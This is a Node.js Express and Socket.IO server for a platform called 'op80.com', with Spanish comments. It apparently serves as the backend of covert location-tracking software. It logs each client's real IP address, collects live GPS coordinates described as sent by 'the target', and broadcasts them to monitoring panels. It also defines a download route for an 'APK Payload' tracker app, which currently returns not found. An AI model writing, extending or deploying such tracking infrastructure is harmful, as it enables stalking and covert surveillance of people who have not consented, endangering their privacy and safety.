const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Middlewares para procesar peticiones
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Servir la interfaz web estática de op80.com
app.use(express.static(path.join(__dirname)));

// Almacenamiento en memoria para nodos y registros de telemetría activa
const activeNodes = new Map();
const telemetryLogs = [];

// Núcleo de Comunicación en Vivo (WebSockets)
io.on('connection', (socket) => {
    // Captura de IP real (compatible con Render y proxies)
    const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress;
    console.log(`[+] op80.com Node Connected -> Socket ID: ${socket.id} | IP: ${clientIp}`);

    // Enviar la IP detectada al cliente de inmediato
    socket.emit('set-ip', { ip: clientIp });

    // Registro de autenticación del nodo
    socket.on('register-node', (data) => {
        activeNodes.set(socket.id, {
            username: data.username || 'Operator',
            ip: clientIp,
            connectedAt: new Date().toISOString(),
            status: 'Active'
        });
        console.log(`[SECURE AUTH] Node registered: ${data.username} (${socket.id})`);
        socket.emit('node-ack', { status: 'success', message: 'Node successfully integrated into op80.com grid.' });
    });

    // Recepción de coordenadas GPS en vivo enviadas por el objetivo
    socket.on('gps-coordinates', (data) => {
        const telemetryEntry = {
            socketId: socket.id,
            lat: data.lat,
            lng: data.lng,
            timestamp: new Date().toISOString()
        };
        telemetryLogs.push(telemetryEntry);
        
        // Limitar historial a los últimos 100 registros
        if (telemetryLogs.length > 100) telemetryLogs.shift();

        console.log(`[GPS TELEMETRY LIVE] Lat: ${data.lat} | Lng: ${data.lng} [Target ID: ${socket.id}]`);
        
        // Transmisión en tiempo real a paneles de monitoreo conectados
        io.emit('live-feed-update', telemetryEntry);
    });

    // Control de desconexión
    socket.on('disconnect', () => {
        if (activeNodes.has(socket.id)) {
            console.log(`[-] op80.com Node Disconnected -> ID: ${socket.id} (${activeNodes.get(socket.id).username})`);
            activeNodes.delete(socket.id);
        } else {
            console.log(`[-] Client Disconnected -> ID: ${socket.id}`);
        }
    });
});

// Endpoint de estado del sistema op80.com
app.get('/api/status', (req, res) => {
    res.json({
        platform: "op80.com",
        status: "OPERATIONAL",
        activeNodesCount: activeNodes.size,
        uptime: process.uptime()
    });
});

// Ruta de descarga del APK Payload complementario
app.get('/download/op80-tracker.apk', (req, res) => {
    res.status(404).send("APK Payload package not found on this endpoint. Contact administrator.");
});

// Puerto de escucha dinámico asignado por Render o por defecto 3000
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`==================================================`);
    console.log(`🚀 op80.com KERNEL RUNNING LIVE ON PORT: ${PORT}`);
    console.log(`🌐 Waiting for real-time telemetry signals...`);
    console.log(`==================================================`);
});
